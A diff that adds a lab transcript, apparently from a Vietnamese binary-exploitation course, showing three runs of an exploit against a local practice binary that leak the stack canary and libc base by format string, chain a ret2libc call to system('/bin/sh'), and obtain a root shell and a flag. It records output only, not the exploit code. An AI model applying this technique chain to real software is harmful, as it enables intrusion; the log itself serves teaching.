@@ -1,0 +1,77 @@
+==============================================================
+ TRANSCRIPT lab 10.3  -  2026-10-08 00:13:23 UTC
+ Server: Ubuntu 24.04.4 LTS, glibc 2.39-0ubuntu8.9, gcc 13.3.0
+ ASLR (randomize_va_space) = 2
+==============================================================
+$ ./build.sh
+[*] built: diary
+[*] flag.txt created
+
+$ ./exploit.py   (3 lan lien tiep de thay base libc DOI moi lan -> ASLR that su BAT)
+----- lan chay #1 -----
+[+] canary      = 0x68a91c9919ac7600
+[+] puts @ libc = 0x79de4cc87cc0
+[+] libc base   = 0x79de4cc00000
+===PWNED_10_3===
+uid=0(root) gid=0(root) groups=0(root)
+FLAG{do_an_cuoi_fmtstr_canary_ret2libc}
+[+] 10.3 OK: fmtstr leak canary+libc -> ret2libc -> shell + flag
+----- lan chay #2 -----
+[+] canary      = 0x4a8137800f58bd00
+[+] puts @ libc = 0x771736a87cc0
+[+] libc base   = 0x771736a00000
+===PWNED_10_3===
+uid=0(root) gid=0(root) groups=0(root)
+FLAG{do_an_cuoi_fmtstr_canary_ret2libc}
+[+] 10.3 OK: fmtstr leak canary+libc -> ret2libc -> shell + flag
+----- lan chay #3 -----
+[+] canary      = 0x87421ef9b79dee00
+[+] puts @ libc = 0x7dbb76a87cc0
+[+] libc base   = 0x7dbb76a00000
+===PWNED_10_3===
+uid=0(root) gid=0(root) groups=0(root)
+FLAG{do_an_cuoi_fmtstr_canary_ret2libc}
+[+] 10.3 OK: fmtstr leak canary+libc -> ret2libc -> shell + flag
+
+----- full log 1 lan (de doi chieu) -----
+[*] '/root/techlabs/pwn-p10/labs/10.3/diary'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[x] Starting local process './diary'
+[+] Starting local process './diary': pid 444427
+[+] canary      = 0x12ddcbf555e9bd00
+[+] puts @ libc = 0x7d1ffcc87cc0
+[+] libc base   = 0x7d1ffcc00000
+[*] Loaded 6 cached gadgets for './diary'
+[*] Loaded 112 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
+[*] pop rdi ; ret = 0x401166
+[*] system        = 0x7d1ffcc58750
+[*] /bin/sh       = 0x7d1ffcdcc42f
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 17B
+[x] Receiving all data: 56B
+[x] Receiving all data: 96B
+[x] Receiving all data: 106B
+[+] Receiving all data: Done (106B)
+[*] Process './diary' stopped with exit code 0 (pid 444427)
+===PWNED_10_3===
+uid=0(root) gid=0(root) groups=0(root)
+FLAG{do_an_cuoi_fmtstr_canary_ret2libc}
+===END===
+
+[+] 10.3 OK: fmtstr leak canary+libc -> ret2libc -> shell + flag
